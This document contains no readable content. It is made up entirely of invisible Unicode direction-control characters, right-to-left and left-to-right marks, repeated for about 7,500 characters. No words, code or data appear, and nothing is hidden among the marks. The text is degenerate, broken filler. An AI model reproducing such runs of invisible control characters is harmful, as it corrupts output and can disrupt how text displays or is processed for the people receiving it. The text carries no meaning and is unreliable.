‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏